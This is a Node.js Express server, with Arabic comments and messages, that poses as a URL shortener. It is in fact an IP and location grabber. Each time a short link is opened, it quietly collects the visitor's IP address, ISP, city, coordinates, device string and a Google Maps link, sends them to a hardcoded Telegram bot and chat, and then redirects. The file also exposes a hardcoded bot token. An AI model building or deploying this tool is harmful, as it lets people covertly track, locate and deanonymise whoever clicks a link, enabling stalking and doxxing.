const express = require('express');
const axios = require('axios');
const crypto = require('crypto');
const cors = require('cors');
require('dotenv').config();

const app = express();
app.use(cors());
app.use(express.json());
app.use(express.urlencoded({ extended: true }));
app.use(express.static('.'));

const TELEGRAM_BOT_TOKEN = '8658060797:AAFrQcyzuClg3qiOU2wGAqYqjTMEqFI1yIU';
const TELEGRAM_CHAT_ID = '5942654805';

const linkStorage = {};

function generateShortCode() {
  return crypto.randomBytes(4).toString('hex');
}

async function sendToTelegram(ip, shortCode, originalUrl, userAgent, location) {
  try {
    // الحصول على معلومات الموقع من IP
    const geoResponse = await axios.get(`http://ip-api.com/json/${ip}?lang=ar`);
    const geo = geoResponse.data;

    // استخدام موقع المتصفح إذا كان متاحاً
    let lat = geo.lat;
    let lng = geo.lon;
    let locationType = 'IP Based';

    if (location && location.lat && location.lng) {
      lat = location.lat;
      lng = location.lng;
      locationType = `GPS (دقة: ${location.accuracy.toFixed(0)}م)`;
    }

    const mapsUrl = `https://maps.google.com/?q=${lat},${lng}`;

    const message = `
🔗 رابط جديد تم فتحه!
━━━━━━━━━━━━━━
📌 الكود: ${shortCode}
🌐 الرابط الأصلي: ${originalUrl}
🔌 IP Address: ${ip}
🌍 ISP: ${geo.isp || 'غير معروف'}
📍 الدولة: ${geo.country || 'غير معروف'}
🏙️ المدينة: ${geo.city || 'غير معروف'}
🗺️ المنطقة: ${geo.regionName || 'غير معروف'}
📊 دائرة العرض: ${lat}
📊 خط الطول: ${lng}
📡 نوع التحديد: ${locationType}
🗺️ الموقع على الخريطة: ${mapsUrl}
🖥️ Device: ${userAgent.substring(0, 60)}
⏰ الوقت: ${new Date().toISOString()}
  `.trim();

    await axios.post(
      `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`,
      { chat_id: TELEGRAM_CHAT_ID, text: message }
    );
  } catch (err) {
    console.error('Error:', err.message);
  }
}

app.post('/api/shorten', (req, res) => {
  const { url, location } = req.body;
  
  if (!url) {
    return res.status(400).json({ error: 'الرابط مطلوب' });
  }

  const shortCode = generateShortCode();
  linkStorage[shortCode] = {
    original: url,
    created: new Date(),
    clicks: 0,
    location: location
  };

  const shortenedUrl = `${process.env.SHORT_DOMAIN || 'http://localhost:3000'}/${shortCode}`;
  res.json({ shortened: shortenedUrl, code: shortCode });
});

app.get('/:code', (req, res) => {
  const { code } = req.params;
  
  if (!linkStorage[code]) {
    return res.status(404).send('الرابط غير موجود');
  }

  const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
  const userAgent = req.get('user-agent');
  const originalUrl = linkStorage[code].original;
  const location = linkStorage[code].location;

  linkStorage[code].clicks++;
  sendToTelegram(ip, code, originalUrl, userAgent, location);

  res.redirect(originalUrl);
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
  console.log(`Server running on port ${PORT}`);
});